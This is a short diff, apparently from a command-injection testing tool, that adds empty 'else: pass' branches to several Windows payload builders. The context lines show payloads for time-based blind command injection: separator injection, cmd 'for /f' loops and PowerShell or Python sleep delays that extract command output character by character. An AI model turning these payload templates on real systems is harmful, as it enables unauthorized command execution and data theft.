@@ -43,6 +43,9 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
+    else:
+      pass
+
   else:
     if separator == ";" or separator == "%0a":
       payload = (separator +
@@ -107,6 +110,9 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                 "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
+    else:
+      pass
+
   else:
     if separator == ";" or separator == "%0a":
       payload = (separator +
@@ -176,6 +182,8 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                 "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
+    else:
+      pass
 
   else:
     settings.USER_APPLIED_CMD = cmd
@@ -243,6 +251,9 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                 "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
+    else:
+      pass
+
   else:
     settings.USER_APPLIED_CMD = cmd
     if separator == ";" or separator == "%0a":
@@ -309,6 +320,8 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
+    else:
+      pass
 
   else:
     cmd_exec = cmd
@@ -385,6 +398,9 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                 "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
+    else:
+      pass
+
   else:
     settings.USER_APPLIED_CMD = cmd
     if separator == ";" or separator == "%0a":
@@ -452,6 +468,8 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                 "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
+    else:
+      pass
 
   else:
     if separator == ";" or separator == "%0a":
@@ -510,6 +528,9 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
                 "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
+    else:
+      pass
+
   else:
     if separator == ";" or separator == "%0a":
       payload = (separator +
